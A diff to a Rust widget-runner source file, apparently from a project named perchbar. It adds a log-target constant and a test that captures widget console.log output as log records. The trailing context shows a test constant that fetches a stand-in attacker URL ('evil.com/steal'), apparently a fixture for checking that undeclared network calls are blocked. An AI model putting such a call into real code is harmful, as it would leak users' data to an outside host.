@@ -96,6 +96,8 @@ pub const OUTPUT_MAX_BYTES: usize = 128 * 1024;
 /// `RunError` messages are cut to this many characters (they end up in the
 /// log and in tooltips).
 pub const ERROR_MAX_CHARS: usize = 300;
+/// Log target of widget `console.log` / `log` lines.
+pub const WIDGET_LOG_TARGET: &str = "perchbar::widget";
 
 /// Cuts an error message to `ERROR_MAX_CHARS` characters, the last one an
 /// ellipsis, so a widget cannot flood the log or a tooltip.
@@ -599,6 +601,44 @@ mod tests {
             "(() => { console.log(\"a\", 1, { b: 2 }); log(\"c\"); return \"logged\"; })()",
         ));
         assert_eq!(text(&f.run().await.unwrap()), "logged");
+    }
+
+    /// Keeps every log record of the test binary as (target, level, text).
+    struct Capture(Mutex<Vec<(String, log::Level, String)>>);
+
+    impl log::Log for Capture {
+        fn enabled(&self, _: &log::Metadata) -> bool {
+            true
+        }
+        fn log(&self, r: &log::Record) {
+            self.0.lock().unwrap().push((
+                r.target().to_string(),
+                r.level(),
+                r.args().to_string(),
+            ));
+        }
+        fn flush(&self) {}
+    }
+
+    static CAPTURE: Capture = Capture(Mutex::new(Vec::new()));
+
+    #[tokio::test]
+    async fn console_log_reaches_the_log_as_a_perchbar_record() {
+        let _ = log::set_logger(&CAPTURE);
+        log::set_max_level(log::LevelFilter::Trace);
+        let f = Fixture::new(&returning(
+            "(() => { console.log(\"marker-7f3a\", 42); return \"ok\"; })()",
+        ));
+        assert_eq!(text(&f.run().await.unwrap()), "ok");
+        let records = CAPTURE.0.lock().unwrap();
+        let (target, level, msg) = records
+            .iter()
+            .find(|(_, _, m)| m.contains("marker-7f3a"))
+            .expect("widget log record captured");
+        assert_eq!(target, WIDGET_LOG_TARGET);
+        assert!(target.starts_with("perchbar"));
+        assert_eq!(*level, log::Level::Info);
+        assert_eq!(msg, "[inst-1] marker-7f3a 42");
     }
 
     const UNDECLARED_FETCH: &str = "await fetch(\"https://evil.com/steal\")";
